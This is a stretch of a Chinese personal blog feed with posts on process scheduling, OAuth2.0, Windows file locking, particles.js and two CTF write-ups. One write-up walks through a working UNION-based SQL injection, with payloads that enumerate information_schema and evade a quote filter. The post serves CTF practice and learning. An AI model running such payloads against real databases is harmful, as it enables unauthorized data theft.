最高优先数优先算法不关注进程的各种时间，而根据进程的**优先数（又称优先级）**进行调度。这个算法要求每个进程都要具备一个优先级，这个优先级可以是静态的，也可以是动态的。静态优先级在进程创建的时候分配，在进程生存周期内保持不变；动态优先级允许在进程生存期内被修改。\n实际上，之前的几种算法可以看做是这个算法的特例：比如短作业优先算法，进程的优先级可以看成是与运行时间成反比的一个数，即进程运行时间越短，优先级越高，因而越短的进程越先得到调度。\n在这个算法中，我们要引入两个概念：剥夺和非剥夺（又称抢占和非抢占）。\n*剥夺（抢占）*指的是在一个进程到达的时候，若当前运行的进程优先级小于自己，则它可以抢占当前进程的CPU，而被抢占的进程就会进入就绪队列，等待下一轮调度。\n*非剥夺（非抢占）*的调度方式就是指无论到达的进程优先级多高，都要等待当前进程运行完成（或者分配给它的时间用完），才能进入调度。\n以看病为例，抢占的看病方式就是你正在被医生诊断，此时突然来了急诊，医生就把你扔下，先去抢救伤员了；而非抢占的方式就是医生一定要把你诊断完成，再去抢救伤员。\n例子听起来比较离谱。这两种方式实际上各有优点，读者可以自行体会。\n回到正题，我们先考虑抢占方式下的HPF算法，首先为上面的例子中的几个进程引入优先级：\n\r新例子\r\n在第0秒的时候，进程1到达，开始为其服务；\n在第1秒的时候，进程5到达，由于进程5的优先级高于进程1，此时将暂停进程1的服务，转为服务进程5，记住此时进程1还需要运行3秒的时间；\n在第2秒的时候，进程3到达，由于进程3的优先级低于进程5，CPU继续服务进程5；\n在第3秒的时候，进程5运行结束，此时进程2到达，现在等待的进程有1/2/3，由于进程2的优先级最高，系统为其服务；\n在第7秒的时候进程4到达，不会打断进程2；\n在第9秒的时候，进程2结束，此时等待的进程有1/3/4，由于进程3的优先级最高，系统为其服务；\n在第19秒的时候，进程3结束，此时等待的进程有1/4，由于进程4的优先级更高，系统为其服务；\n在第27秒的时候，进程4结束，此时为进程1服务，完成剩下的3秒时间，在第30秒结束。\n\r抢占式HPF\r\n在这个例子中，进程1最先到达，最晚结束，简直惨兮兮；但是我们首次看到了两个带权周转时间为1的情况，表明这个调度方式在优先级设置合理的条件下，效率还是不错的。\n对于非抢占式调度，上面三个小节已经讲了太多，在此不加赘述。\n 小结  本文介绍了四种调度算法，并以几个简单的例子具体模拟了它们的运行模式。本来还希望附上这几个算法的代码实现，但篇幅有限，只好新开一篇。\n如果你认为我有哪些地方没有讲清楚，或者有哪些错误之处，欢迎评论区留言告诉我。(ノ￣▽￣)\n ","date":"2020-10-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/","title":"一些简单的进程调度算法"},{"content":"本文将介绍开放授权协议的概念，OAuth协议解决的问题以及OAuth协议的设计方案与应用情况。\n1. 背景  在生活中，我们接触的各种网络服务通常需要使用我们的个人资源。例如，我们使用网易云音乐，但是选择QQ登录，这时网易云需要获取我们的QQ账号信息，如果双方之间没有一个有效的授权机制，就会对我们的隐私安全造成威胁。试想：网易云音乐如何获取我们的QQ账号信息呢？无非是让我们给出我们的账号密码吧。但是这样做有如下严重的缺点：\n 我们需要把QQ账号密码告诉网易云音乐，增加了泄露的风险； 网易云音乐拥有了对你的QQ账号的操作权限——想想都头皮发麻； 需要收回网易云音乐对QQ的访问权限时，只能通过修改密码的方式，但是这样做会使其他使用同样方式访问QQ的应用全部失效。  基于此，开放授权（Open Authorization）希望能够使得第三方无需知道用户的账号及密码，就可以获取用户的授权信息。\n如果是你，你会怎么实现它？\n 2. 设计方案  OAuth2.0主要涉及四种角色，分别是：\n 用户，即资源所有者。 资源服务器，即服务提供商。用来存放受保护的用户资源。在上面的例子中，资源服务器就是QQ服务器。 客户端，向资源服务器进行资源请求的第三方应用程序。在上面的例子中，客户端就是网易云音乐服务器。 认证服务器，在验证资源所有者并取得所有者的授权后，将访问令牌发给客户端。当我们想使用QQ登录网易云音乐，首先就是要证明我们的号主身份，这就是认证服务器的工作——证明身份、取得授权、允许第三方访问。  显然，资源服务和认证服务的提供者都是QQ，因此它们可以运行在同一台服务器上。\nOAuth2.0 就是在这四个角色的基础上，设计了四种授权模式：授权码（Authorization Code）模式、简化模式、密码模式和客户端模式。下面就重点一起看一下授权码模式的工作流程。\n 3. 授权码模式  授权码是认证服务器提供的一串序列，客户端可以凭借授权码向认证服务器索要访问令牌（Access Token），进而实现相应资源的访问。没看懂？举个例子——\n 还是使用QQ授权登录网易云音乐，我们需要经历如下的流程：\n 打开网易云音乐，点击“使用QQ登录”； 网易云音乐跟我们说：想使用QQ登录？行，但是我现在没有访问QQ账号的权限，给你张纸条，上面写了我要访问你账号哪些信息，你去找QQ让他同意我访问； 于是我们来到QQ认证界面。QQ首先要我们登录账号，然后跟我们说：网易云音乐想要你的昵称信息、头像信息等等等等，你同意不？ 我们选择同意。于是QQ给了我们一张纸条，跟我们说：这个纸条上写了访问你昵称头像信息的授权码，你拿去给网易云音乐，他拿着这个条子来找我，我就让他访问； 于是我们把写着授权码的条子给了网易云音乐，他拿着这个条子去找QQ了，QQ的认证服务器根据这张条子给网易云音乐开出了一个访问令牌（Access Token），网易云拿到了这张令牌，并凭借它成功访问了我们的QQ账号信息。 网易云音乐拿到这个账号信息，在自己数据库里面一查，发现这个QQ账号已经跟某个网易云音乐账号绑定了，于是我们成功使用自己的QQ账号登录了网易云音乐。   这就是非常具象的授权码模式，是不是非常简单？\n但是，这里还有一些细节需要思考：\n QQ会说，我这么没牌面的吗？谁想从我这请求资源我就给他？ 在上面的例子中，我们从网易云音乐去找QQ，拿到授权码之后回去找网易云音乐。但是，在真实的浏览器和Web服务器交互的过程中，我们的浏览器可没这么聪明，我们要给它规划好路线才行。  针对第一个问题，OAuth2.0给足了资源服务器面子，它要求：所有的客户端都要在资源服务器那边进行事先的注册，否则直接不给予访问的权限。也就是说，网易云音乐事先已经跟QQ说好了，每次要访问QQ账号信息的时候都会带上身份证明，以表明这是网易云音乐要来访问QQ的资源了。客户端在资源提供方注册的时候，会拿到资源提供方给出的一个client_id和client_secret，之后就用这两个东西表明身份。\n而针对第二个问题，我们在向QQ请求授权码的时候，需要提供redirect_uri（或callback_uri）字段，表明浏览器拿到授权码之后要交给谁。于是，授权码模式的完整交互流程如下：\n\r授权码工作模式\r\n 4. 简化模式  看完授权码模式，如果你觉得这个流程有点繁琐，那么简化模式可能会让你快乐一些：\n\r简化模式\r\n在这个模式中，少掉了授权码的传递，直接传递访问令牌，所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。\n这样的模式对一些纯前端的网络服务比较友好，因为它不需要资源请求者与资源提供者进行认证交互，直接拿着访问令牌找上门就好了。\n但是它叫简化模式，就是因为它存在安全问题。试想：重要的访问令牌就这样在浏览器和资源提供方之间传递，假设攻击者截获了访问令牌，就能够获取到你的资源。\n 5. 密码模式  在密码模式中，用户向客户端提供自己的用户名和密码。客户端使用这些信息向资源服务器索要授权。这就是我们开头讲过的模式，它要求用户提供自己的用户名和密码，但是客户端不得存储这些信息。显然该模式建立在用户对客户端的高度信任上，通常这里的客户端属于操作系统的一部分，或者由著名的公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才考虑使用这种模式。\n 6. 客户端模式  客户端以自己的名义，而不是用户的名义，向服务提供商进行认证。严格地说，这种模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求服务提供商提供服务，其实不存在授权问题。\n 小结 OAuth2.0 协议率先被谷歌、雅虎、微软、FaceBook等公司使用，且目前得到较广泛的普及。之所以标注为2.0，是因为最初有一个1.0协议，但是这个1.0协议太复杂，易用性差，所以没有得到普及。2.0是一个新的设计，但它并不兼容1.0，可以说与1.0没什么关系。\n本文简要介绍了OAuth2.0的四种工作方式，通过网易云音乐和QQ的认证交互，希望能使读者对此有初步的认识。关于具体的交互URL，本文没有给出，可以参考文末的一些博客。关于针对OAuth2.0的一些攻击手段，请见下回分解。\n参考资料： [1] 石瑞生，吴旭. 大数据安全与隐私保护[M]. 北京：北京邮电大学出版社，2019\n[2] 十八岁的夏天. OAuth2.0的简介. [EB/OL]. [2019-08-19]. https://www.cnblogs.com/xiaofengwang/p/11376881.html\n[3] 阮一峰. 理解OAuth2.0. [EB/OL]. [2014-05-12]. http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\n","date":"2020-10-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/oauth2.0%E6%B5%85%E6%9E%90/","title":"OAuth2.0浅析"},{"content":"这段期间没学到任何完整的、值得记录的东西，因此好久没有更新博客了，凑巧中午一边喝大红袍一边搞出了一点东西，虽然不太完整，也不妨一记。\n最近在捣鼓Windows下应用程序调用API的情况统计，思路是向指定的进程中注入DLL，钩取系统API，这样每次进程调用API的时候先执行我们的语句，向统计文件中写入一条调用信息。\n由此，引出了一个问题：如果我们注入了多个进程，这些进程同时调用一个API的时候，都要往统计文件中写一条信息，如何保持它们的同步呢？\n答案就是文件锁。\n 锁   互斥锁是操作系统用来保持进程间同步的一个关键工具，多个进程同时对一个对象执行操作的时候，要分清楚先后顺序，否则可能产生混乱。比如，一个进程1要向一个文件里面写入1 ~ 100的数，而进程2要向这个文件里面写入101 ~ 200的数，我们希望进程1写完之后再让进程2写，但是系统在执行进程调度的时候，是可能在进程1写到一半的时候将其挂起，转而去执行其他进程的。想一想有没有可能出现这种情况：进程1写到了50，系统将其挂起，去执行其他进程，其他进程执行完之后，系统不执行进程1，而是执行进程2，于是我们的文件中的数字就变成了1,2\u0026hellip;50,101,102\u0026hellip;\n显然，这样的情况是可能出现但是绝对不符合需求的，我们要想办法避免它。\n于是操作系统为我们提供了互斥锁，即一个进程对某个对象执行操作的时候，将这个对象锁定，这时其他的进程就无法对这个对象执行操作了。\n本篇中的文件锁其实就是作用在文件上的互斥锁。还是刚才的例子，如果进程1在一开始就为文件上了锁，当它执行到一半被挂起的时候，即使系统转为执行进程2，此时进程2也会因为无法获得文件锁而被阻塞；仅当进程1完成了写入，释放了文件锁，进程2才会被唤醒执行。\n这样的工作模式可不止用来保持文件的读写同步，还可以解决一系列的同步问题。锁的思想在操作系统领域是非常重要的，这里的介绍不够全面，主要也是由于笔者目前的水平不够，有兴趣的朋友可以自行深入了解。\n 创建文件   初步了解了文件锁的含义之后，就要进入编码实践了。本篇后续编码是以C++为主体，但是核心部分完全兼容C语言。\n首先要明确一点，C++的文件流操作无法实现文件锁。这个是笔者目前的水平下得出的结论，欢迎见多识广的读者在评论区批评指正。\n既然无法使用fstream实现文件锁，就必须老老实实使用C语言的文件操作了。\n在这里，由于WindowsAPI提供的文件锁函数需要一个HANDLE类型作为参数，我们只能使用CreateFile函数去创建文件了。\n该API详见此文档。\n我们使用以下两句话创建了一个文件，这里文件路径可以自由定义。\nconst char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA( logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0 ); 值得注意的是CreateFileA的参数OPEN_ALWAYS，该参数指定了文件的打开方式：当文件不存在时，创建它；当文件存在时，打开它。\n 文件上锁   文件创建完成之后，正常的下一步操作应该是写入了。但是谨记，为了不发生开头提到的进程同步问题，我们要在写入文件之前先拿到文件的锁。这里使用Windows提供的一个关键函数LockFileEx()。\n该API详见此文档我们使用以下几句话为文件上了个锁，这里的overlapped变量是API要求我们传入的，没有很大的用处，将其置零即可。\nOVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000;\t// 上锁的字节数，没有很大的意义，非零即可。 if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } 当文件上锁失败，if判断会成立，进入错误处理环节。记住开头提到的锁的机制，当一个进程无法获取当前的文件锁的时候，它应该是会被阻塞而非直接报错。在我的试验中，进入这个分支的情况是第一步CreateFile的时候得到了一个无效的句柄，而非无法获取当前文件的锁。\nLickFileEx()函数的第二个参数比较关键，当它被指定为LOCKFILE_FAIL_IMMEDIATELY 的时候会直接返回失败，而不是阻塞当前进程。在这里，我们当然不选这个参数。\n文件上锁成功之后，就可以进行文件的写入了。\nelse { std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 1 locked the file. [+]\\n\u0026#34;; // 将文件指针移动到文件末尾，实现以追加方式写入 \tSetFilePointer(hFile, 0, NULL, FILE_END); ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); getchar();\t// 在此处停止，先不释放文件锁 \tUnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } 将以上的三个部分结合起来，就是第一个进程的代码：\nint main() { const char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA(logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0); OVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000; if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } else { std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 1 locked the file. [+]\\n\u0026#34;; // 将文件指针移动到文件末尾，实现以追加方式写入 \tSetFilePointer(hFile, 0, NULL, FILE_END); ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); getchar();\t// 在此处停止，先不释放文件锁 \tUnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } system(\u0026#34;pause\u0026#34;); return 0; }  第二个进程   第二个进程被我们用来验证这个锁的可行性，即当第一个进程为文件上了锁，且还没释放的时候，第二个进程究竟能否对文件进行写入。\nint main() { const char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA(logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0); OVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000; if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } else { std::cout \u0026lt;\u0026lt; \u0026#34;Get lock.\\n\u0026#34;; std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 2 locked the file. [+]\\n\u0026#34;; SetFilePointer(hFile, 0, NULL, FILE_END);\t// 将文件指针移动到文件末尾，实现以追加方式写入 \t::WriteFile(hFile, str.c_str(), str.length(), 0, 0); // getchar();\t// 在此处停止，先不释放文件锁 \tUnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } system(\u0026#34;pause\u0026#34;); return 0; }  验证    首先运行第一个进程，它将在getchar()函数部分停止，此时还没有释放文件锁； 转为运行第二个进程，此时它无法对文件进行上锁操作； 在第一个进程窗口按下任意键，它将释放文件锁，并关闭文件句柄； 观察第二个进程输出，发现它已经得到文件锁，并在文件中写入了对应信息。  \r先后打开两个进程\r\n\r第一个进程释放锁\r\n\r文件内容实现同步\r\n ","date":"2020-09-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E6%96%87%E4%BB%B6%E5%90%8C%E6%AD%A5%E5%86%99/","title":"进程间文件同步写"},{"content":"初生的博客，更新就是频繁。\n如果你看到这篇博文，应该能注意到这篇博文的背景有了一点小变化。\n没错，在这篇文章里，我要记录一款强大的JS插件particles.js的使用方法，这款应用能让你的网页背景看起来不那么单调（简直非常适合我现在的博客主题）。\n你可以在下面这个链接找到这款应用的源码，虽然我成功使用这款插件的历程比较艰辛，但是我还是非常敬佩能写出这种代码的人。\n(https://github.com/VincentGarreau/particles.js)\n话不多说，let\u0026rsquo;s go!\n下载这款插件  你可以直接使用git clone或者从网页上下载它。\n解压完成之后，你可以看到一个Demo文件夹，不妨先进去看看正确使用这款应用的时候能产生什么效果。\n 在源码中为插件留出位置  在插件作者的GitHub仓库里实际上已经写明了使用方法，但是我要结合hugo和我的主题——Keepit——再详细地介绍一次。\n在你的页面中为插件留出位置，这个操作非常简单。打开你的footer.html，找一个合适的位置（最好是最外层），加上一个标签：\n\u0026lt;div id=\u0026quot;particles-js\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\n然后，就没有然后了！现在你的插件已经能够找到它的容身之所了，准备让它运行起来吧！\np.s footer.html在文件夹partials里，看过第一篇博文的你，应该很熟悉它的内容了吧？关于我们为什么要在这个文件里加上这个东西，主要是考虑到任何界面都有这么一个版权说明模块，那么也就是任何界面到时候都会有漂漂亮亮的背景！还有，我认为可能存在某些主题没有footer.html文件，但是这根本没什么关系，你也可以把这个div加在任何你想要的的地方。\np.p.s 2021年1月14日，现在我把这部分代码加在了layouts/_default/baseof.html，因为它似乎是所有页面的基本框架，适用性更强一些。\n 引入插件  你可能会认为，这篇博文的第二步和第三步完全可以调换顺序，如果你这么想了，也这么做了，那我祝你不要踩到我踩过的坑。\n我们要在第二步的div底下写入插件。\n为什么这样？因为JavaScript的加载顺序是从前往后的。有过Bootstrap框架使用经验的朋友应该知道，在使用Bootstrap的JS应用时，要在之前首先引入jQuery，否则整个页面将无法实现应有的功能！\n我们的顺序也是如此。在我使用这个插件的时候，尝试过过几种方法：在/asset/js文件夹中放入相应的JS文件；在partials文件夹中写一个custom_js.html文件，里面是几条简单的\u0026lt;script\u0026gt;标签；修改partials文件夹中的head.html文件，在头部就引入插件；在第二步的\u0026lt;div\u0026gt;之前写入几条\u0026lt;script\u0026gt;标签。\n以上方法全部失败。\n因此，你不要小看这篇博文的分量，它可能可以帮助你节省几个小时的试错时间。\n言归正传，我们还是需要把插件的JS文件引入到源码中。要想插件能够工作，你只需要使用两个文件：particles.js和app.js，他们分别在第一步那个项目的根目录里，还有Demo文件夹里。particles.js是发挥功能的文件，而app.js是配置文件，具体能配置些什么，后面再说，总之，先使用别人帮你写好的东西吧。\n接下来的一步很重要：把这两个文件放入public/js文件夹中!\n你都看到这篇文章了，肯定已经在GitHub上有自己的第一个页面了吧？你会发现，public文件夹的结构跟你的仓库的结构是一样的，我们的GitPage的CSS、JS等文件，都存在对应的路径底下。也就是说，**当你把这两个JS文件放到了public/js文件夹底下，你等一下git push的时候就会把这两个文件也一并推送到远程仓库的对应位置。**这样，你的源码就能找到JS文件了。\n将两个JS文件引入，记得放在第二步的div后面：\n\u0026lt;script src=\u0026#34;xxxxx/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;xxxxx/particles.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 这里的“xxxx”是你放置这两个文件的路径，我接下来要教你一个取巧的办法。\n 巧妙地获取路径  如果你的代码中，这两个JS文件的路径出了问题，那很不幸，当你打开页面的时候一定是见不到背景的，而且，你按下F12，还能看到控制台给你报出的无情的404 Not Found。\n我们要怎么使远程仓库中的代码也能找到正确的路径呢？如果使用src=\u0026quot;/js/app.js\u0026quot;这样的语句，当你打开网站的主页，它会找到https://yourWeb.github.io/js/app.js，看起来非常的正确；但是当你在网站里面的某个页面里，比如某一篇博文中，它就会去找https://yourWeb.github.io/post/article1/js/app.js，必然是失败的，于是你的博文就不能有漂亮的背景了 :(\n正确的获取路径的姿势，你可以直接使用绝对路径，也就是https://yourWeb.github.io/js/app.js这样的方式。\n底下是我的代码，绝对路径的方法理论上适用于所有主题，你应该把代码里的src值改成自己的仓库：\n\u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/particles.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/app.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt;  代码的最终样式及推送  经过一系列的修改后，你的页面的代码就多了如下的东西：\n\u0026lt;div id=\u0026#34;particles-js\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/particles.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/app.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; 此外，你的public/js文件夹中还多了两个文件app.js和particles.js。\n现在，不要以为一切已经结束了，因为你的这个div，你的页面现在多了一个元素，如果它位于footer上方，那它会使得你的页面被撑得很长，我们要在主页面的CSS文件里修改它。\n进入public/css文件夹，如果是Keepit主题，就只有一个文件，打开它；如果是其他主题，你需要找到能发挥作用的CSS。\n在文件最末尾补上这样的代码：\n.particles-js-canvas-el { position:fixed; top:0; left:0; width:100% } position设定为fixed，使得整块画布独立于你页面的其他元素；由于它独立了，就需要使用top、left来指定它的位置；最后是画布的宽度，填满整个屏幕即可。\n这样，就完成了所有的步骤了。\n我们回顾一下总共做了什么：\n  下载主题，将两个JS文件放到public/js文件夹里。 在代码的相应位置写上div。 在div的下方用script标签和绝对路径引入这两个文件。 修改CSS，使背景独立。   完成以上步骤，就使用hugo编译静态页面，然后进入public文件夹用git把它推送到远程仓库上吧！\n 背景样式的修改  如果一切顺利，你的背景已经很不错了。现在你可以通过配置app.js的方法进一步修改它。\napp.js文件是配置背景的文件，它可以改变背景中每个粒子的形状、颜色、移动方式等等。\n下面这个链接将每一个字段的取值和含义写得非常清楚：\n(https://www.jb51.net/article/123594.htm)\n例如我的particles.color.value = \u0026quot;random\u0026quot;，这是为了在白色主题的情况下也可以看到背景特效。\n 一些细节  此部分增加于2021年1月14日\n博客已经发布了十来篇文章，重看此文，有一些细节（或不如说是遗留的BUG）是值得一提的。\n JS的加载顺序。本文前面的代码已经将JS的加载顺序考虑了进来，且添加了async标签指示浏览器按照顺序加载两个JS文件，然而这样的写法似乎是无用的，因为我的博客还是时不时地丢失掉背景效果；实际上使得JS按照顺序加载的办法还有不少，可以留待读者自行查找资料实现（主要是作者懒）。 hugo的版本。博客搭建指南——1中提到了要下载hugo-extend，你除了使用文章中介绍的办法下载之外，还可以使用chocolate包管理器下载，具体做法可以使用搜索引擎查找，比较简单。而正如那篇文章中所说，如果你不安装extend版本，你将无法编译SCSS文件，而这对于我们这款主题（相信还有其他很多精美的主题）来说是很致命的。与本文相关的，如果你使用的不是extend版本的hugo，你在第5小节中自定义的CSS样式可能不会生效。   以上，是本篇的全部内容。\n","date":"2020-09-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%972/","title":"博客搭建指南——2"},{"content":"题目链接：(https://ctflearn.com/challenge/97)\n  一道隐写题，信息隐藏在给出的图片文件里。\n  打开图片，是一张普通的png，使用010editor打开，发现实际上是jpg格式（以FF开头）。\n  010 editor搜索FF D9，找到偏移量为0x256E处的那个，发现其后有敏感的PK字样，这是zip文件的开头，线索已经出现了。\n  使用命令分离出zip文件。dd if=AGT.png bs=1 skip=9584 of=foo.zip\n  解压文件，得到一个文件夹，里面含有一张图片I Warned You.jpeg\n  010 editor打开该文件，发现它实际上不符合JPG文件的格式。用记事本打开，ctrl + f查找ctf字样，得到flag。\n  回顾\n   这道题大概做了将近一小时\u0026hellip; 是我接触隐写题的简单解法之后第一次实践。解压之后的jpg文件使我一度怀疑自己对偏移量的计算存在问题，万万没想到这jpg格式完全是用来坑爹的（= = ||）。\n使用记事本一开始查找的是flag字串，结果是没找到，居然也没有再找一下其他可能的形式，就这么回去又反复检查zip文件的偏移地址了\u0026hellip;\u0026hellip;\n ","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/ctflearn-07601/","title":"CTFLearn-07601"},{"content":"题目链接：(https://ctflearn.com/challenge/149)\n 此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手\u0026hellip; \u0026hellip;\n  根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。   ret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;}) soup = BeautifulSoup(ret.text, \u0026#39;lxml\u0026#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 or 1=1\u0026#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用  至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。   首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;-2 union select 1,2,3\u0026#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;-2 union select 1,2,3,4\u0026#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,2,3,4,5\u0026#34;}) # Output: # 0 results 已经明确了，系统做的每一次查询结果就是有四个字段，只需要将对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来。\n  开始查看数据库名，使用database()函数或者information_schema数据库维护的信息。\n  information_schema 是MySQL自带的数据库，它保存着MySQL服务器维护的所有其他数据库的信息，如数据库名、数据库的表、表栏的数据类型与访问权限等。   在此仅记录第二种办法。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4\u0026#34;}) # Output: # Name: Information_schema, webeight # Breed: 1 # Color: 3 这里，group_concat使得查询结果是批量的，而第二个字段对应地显示出了我们希望看到的——所有的数据库名。\n  开始查询webeight数据库中的数据表。\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874),3,4\u0026#34;}) # Output: # Name: w0w_y0u_f0und_m3,webeight # Breed: 1 # Color: 3 这里需要注意，本来第二个字段的SQL语句应该是：\nselect group_concat(table_name) from information_schema.tables where table_schema='webeight'\n但是，这道题中的单引号是被过滤的！\n于是采用十六进制来表示webeight这个字符串，直接转换，不需要考虑什么大端小端存储-。（我在说什么x）\n于是就有了上面的那句：\nselect group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874\n得到的结果也是比较漂亮的，找到了关键的表。\n  得到表之后，要查找字段了。方法差不多，总的来说就是在折腾information_schema库中存储的信息而已。\nselect group_concat(column_name) from information_schema.columns where table_schema=0x7765626569676874 and table_name=0x7730775f7930755f6630756e645f6d33 # Output: # Name: f0und_m3 # ... 这里是第二个字段要填入的SQL语句，比较长，因此不写出完整的python语句，以免阻碍观瞻。\n此处要注意，group_concat()中的字段名column_name是一定不能改的，包括之前的所有SQL语句，在查询information库的时候，选用的字段名要按照规定的来，否则必然得不到结果。\n  以上已经得到了目标表的目标字段，使用最后一个简单的查询结束这道题：\nselect f0und_m3 from w0w_y0u_f0und_m3 # Output: # Name: abctf{uni0n_1s_4_gr34t_c0mm4nd} # ...  总结   这道题光是题解就已经写了将近一小时，只希望日后有人读起时不要忘记作者作为一个菜鸡在这题面前苦苦挣扎的一下午。SQL注入真是一个漫长而复杂的过程，而其中多数难点就在于搞安全的人对于数据库语句、底层实现等的不了解；我在今天才接触到了information_schema、group_concat等诸多知识，想来这作为一个练习还是使我获益颇多，但今后，我还是更愿意投靠自动化工具的阵营\u0026hellip; \u0026hellip;\n ","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/ctflearn-inj3ctiontime/","title":"CTFLearn-Inj3ctionTime"},{"content":"当你见到这篇文章的时候，意味着我可以用一种比价体面的方式向所有人分享我的学识和想法了。\n搭建博客，说难也难，说容易也容易。难在确定和学习一款建站工具，以及选择一款好看的主题（或者手写一款好看的主题），而容易指的是当你稍微会使用建站工具、并非常幸运地选中了一款好看且易于配置的主题之后，一切后续都变得无比丝滑。\n本博客，部署于GitHub，属于静态网页，使用Hugo搭建，使用现成的主题https://themes.gohugo.io/keepit/。\n如果你觉得这个主题不错，那么非常幸运地，你可以参考我将要写下的经验，否则本篇对你的意义将打个折扣了。\nThen, let\u0026rsquo;s go!\n下载Hugo  Hugo 